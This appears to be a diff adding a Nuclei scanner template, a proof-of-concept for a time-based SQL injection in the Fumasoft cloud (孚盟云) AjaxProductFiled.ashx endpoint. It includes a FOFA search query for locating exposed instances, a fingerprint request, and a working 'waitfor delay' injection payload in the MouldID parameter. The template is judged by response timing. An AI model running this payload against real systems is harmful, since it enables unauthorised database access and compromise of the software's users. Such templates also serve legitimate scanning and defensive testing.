@@ -1,0 +1,48 @@
+id: poc-yaml-fumasoft-ajaxproductfiled-ashx-sqli
+info:
+  name: 孚盟云 AjaxProductFiled.ashx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: 孚盟云
+    fofa-query: app="孚盟软件-孚盟云"
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "孚盟云"
+
+  - raw:
+      - |
+        GET /m/Dingding/Ajax/AjaxProductFiled.ashx?method=savePuductFiled&MouldID=-1'waitfor%20delay'0:0:{{t1}}'-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+    extractors:
+      - type: dsl
+        dsl:
+          - "duration > {{t1}} && duration < {{t2}}"
